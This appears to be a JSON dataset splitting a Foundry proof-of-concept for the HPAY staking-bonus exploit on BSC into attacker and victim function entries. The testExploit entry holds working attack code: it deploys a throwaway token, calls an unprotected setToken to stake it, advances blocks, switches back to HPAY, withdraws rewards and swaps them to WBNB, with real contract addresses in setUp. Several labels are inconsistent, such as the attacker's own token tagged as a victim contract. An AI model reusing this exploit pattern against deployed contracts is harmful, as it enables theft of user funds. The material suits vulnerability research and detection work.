[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 22_280_853);\n        // Adding labels to improve stack traces' readability\n        vm.label(address(HPAY_TOKEN), \"HPAY_TOKEN\");\n        vm.label(address(WBNB_TOKEN), \"WBNB_TOKEN\");\n        vm.label(address(PS_ROUTER), \"PS_ROUTER\");\n        vm.label(address(BONUS), \"BONUS\");\n        vm.label(0xE9bc03Ef08E991a99F1bd095a8590499931DcC30, \"BONUS_IMPL\");\n        vm.label(0xa0A1E7571F938CC33daD497849F14A0c98B30FD0, \"WBNB_HPAY_PAIR\");\n        vm.label(0xc16e351751e63A34F44908b065Fc8Be592D564dE, \"HPAY_RewardManager\");\n        vm.label(0xf88daA7723f118EfB4416a0DfD129e005CA9166F, \"HPAY_RewardManager_Impl\");\n        vm.label(0x45b10a3C39DE271D8edc23796970acF8832C20ff, \"HPAY_Fund\");\n        vm.label(0x346abB57CfB43aD3Bb8210E3DD1dB12353160A0b, \"HPAY_FeeManager\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\n            \"[Start] Attacker WBNB balance before exploit\", WBNB_TOKEN.balanceOf(address(this)), 18\n        );\n\n        HPAY_TOKEN.approve(address(PS_ROUTER), type(uint256).max);\n        // Shitcoin token creation\n        SHITCOIN shitcoin = new SHITCOIN();\n        shitcoin.mint(100_000_000 * 1e18);\n\n        // Configuring shitcoin and staking it\n        BONUS.setToken(address(shitcoin));\n        shitcoin.approve(address(BONUS), type(uint256).max);\n        BONUS.stake(shitcoin.balanceOf(address(this)));\n\n        // Change block.number\n        vm.roll(block.number + 1000);\n\n        // Configure HPAY token back again\n        BONUS.setToken(address(HPAY_TOKEN));\n\n        // Withdraw reward token\n        BONUS.withdraw(30_000_000 * 1e18);\n        _HPAYToWBNB();\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker WBNB balance after exploit\", WBNB_TOKEN.balanceOf(address(this)), 18\n        );\n    }\n\n    /**\n",
    "description": ""
  },
  {
    "contract/interface": "SHITCOIN",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SHITCOIN",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SHITCOIN",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SHITCOIN",
    "source_type": "victim_contract",
    "function_name": "burn",
    "original_code": "    function burn(uint256 amount) public virtual {\n        _burn(_msgSender(), amount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SHITCOIN",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SHITCOIN",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "    function mint(address to, uint256 amount) public virtual {\n        require(hasRole(MINTER_ROLE, _msgSender()), \"ERC20PresetMinterPauser: must have minter role to mint\");\n        _mint(to, amount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SHITCOIN",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view override returns (string memory) {\n        return _name_;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SHITCOIN",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view override returns (string memory) {\n        return _symbol_;\n    }\n\n    \n",
    "description": ""
  },
  {
    "contract/interface": "SHITCOIN",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SHITCOIN",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SHITCOIN",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n        unchecked {\n            _approve(sender, _msgSender(), currentAllowance - amount);\n        }\n\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMintableAutoCompundRelockBonus",
    "source_type": "victim_contract",
    "function_name": "setToken",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IMintableAutoCompundRelockBonus",
    "source_type": "victim_contract",
    "function_name": "stake",
    "original_code": "    function stake(uint256 _amount) internal override {\n        if(_amount == 0) {\n            return;\n        }\n        stakeAsset.safeIncreaseAllowance(address(stakeContract), _amount);\n        stakeContract.enterStaking(_amount);\n    }\n\n    function unstake(uint256 _amount) internal override {\n        stakeContract.leaveStaking(_amount);\n    }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "IMintableAutoCompundRelockBonus",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(uint256 amount) override virtual public onlyOwner {}\n",
    "description": ""
  }
]